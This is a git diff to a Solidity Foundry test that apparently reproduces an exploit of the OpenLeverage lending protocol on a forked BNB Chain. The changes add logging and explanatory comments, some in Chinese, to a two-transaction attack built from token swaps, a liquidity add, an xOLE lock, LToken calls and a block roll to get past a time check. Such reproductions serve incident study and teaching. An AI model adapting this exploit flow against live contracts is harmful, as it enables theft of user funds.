@@ -136,6 +136,9 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        //get logic contract
+        bytes32 logic = vm.load(0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4,bytes32(uint256(0)));
+        emit log_named_bytes32("000000000000000000000000000:",logic);
         // First TX
         deal(address(this), 5 ether);
         emit log_named_decimal_uint(
@@ -149,6 +152,7 @@ contract ContractTest is Test {
 
         WBNBToOLE();
         // Add liquidity to pair
+        emit log_string("Add liquidity in OLE-USDC pair");
         OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
         USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
         USDC_OLE.mint(address(this));
@@ -157,6 +161,7 @@ contract ContractTest is Test {
         USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));
         xOLE.create_lock(1, 1814400 + block.timestamp);
 
+        // 调用proxy——TradeController中的logic contract.
         (
             ,
             ,
@@ -169,6 +174,7 @@ contract ContractTest is Test {
             ,
 
         ) = TradeController.markets(marketId);
+        // getCash也是通过delegatecall
         uint256 underlyingWBNBBal = LToken.getCash();
         if (underlyingWBNBBal > 1e14) {
             (bool success, ) = address(LToken).call(
@@ -237,7 +243,7 @@ contract ContractTest is Test {
         // Second TX
         // createFrok:328
         // attack:329
-        // rollFork将下面的代码放到block.number为331的环境中执行。
+        // 由于payoffTrade存在时间检查，rollFork将下面的代码放到block.number为331的环境中执行。
         vm.rollFork(37470331);
 
         TradeController.markets(marketId);
@@ -271,7 +277,8 @@ contract ContractTest is Test {
             address(this),
             block.timestamp
         );
-
+        emit log_named_uint("After swap WBNB to USDC, this contract has USDC", USDC.balanceOf(address(this)));
+        emit log_named_uint("After swap WBNB to USDC, this contract has BNB", address(this).balance);
         path[0] = address(USDC);
         path[1] = address(OLE);
         Router.swapTokensForExactTokens(
@@ -281,6 +288,8 @@ contract ContractTest is Test {
             address(this),
             block.timestamp
         );
+        emit log_named_uint("After swap USDC to OLE, this contract has USDC", USDC.balanceOf(address(this)));
+        emit log_named_uint("After swap USDC to OLE, this contract has OLE", OLE.balanceOf(address(this)));
     }
 
     function WBNBToBUSDT() private returns (uint256[] memory amounts) {
